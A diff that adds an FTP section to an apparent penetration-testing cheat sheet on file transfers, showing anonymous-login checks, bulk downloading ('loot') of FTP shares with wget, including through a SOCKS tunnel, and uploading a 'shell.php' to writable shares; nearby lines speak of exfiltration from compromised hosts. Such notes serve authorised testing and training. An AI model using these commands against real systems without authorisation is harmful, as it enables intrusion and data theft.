@@ -67,6 +67,43 @@ scp /local/file user@<target>:/tmp/file        # push from attacker to target
 nc <ip> 443 > /tmp/file
 ```
 
+## FTP
+
+When a target exposes FTP (21), test anonymous access first: it's a common source of loot or a foothold via writable directories.
+
+```bash wrap
+# Anonymous login check
+ftp <ip>
+# Name: anonymous
+# Password: <blank or anything>
+
+nmap --script ftp-anon <ip>       # confirm anonymous access without connecting manually
+```
+
+```
+ftp> ls
+ftp> get file.txt          # single file
+ftp> mget *                # multiple files, prompts per file
+ftp> put shell.php         # upload, if the share is writable
+ftp> bye
+```
+
+Recursive download of an entire FTP share with `wget` — no interactive session needed. Credentials go straight in the URL; the trailing `/*` mirrors every file and subdirectory.
+
+```bash wrap
+wget -r ftp://username:password@ftp.<domain>/*
+
+# Anonymous
+wget -r ftp://anonymous:anonymous@<ip>/*
+
+# Through a Ligolo/Chisel SOCKS tunnel
+wget -r --proxy=on -e ftp_proxy=socks5://127.0.0.1:1080 ftp://anonymous:anonymous@<ip>/*
+```
+
+<Tip>
+`wget -r` on FTP mirrors the whole tree into a local directory named after the host — good for grabbing everything at once when you don't know which file matters yet.
+</Tip>
+
 ## Linux: Uploading Files
 
 Methods to push files from a compromised Linux host back to your attacker machine for exfiltration or analysis.
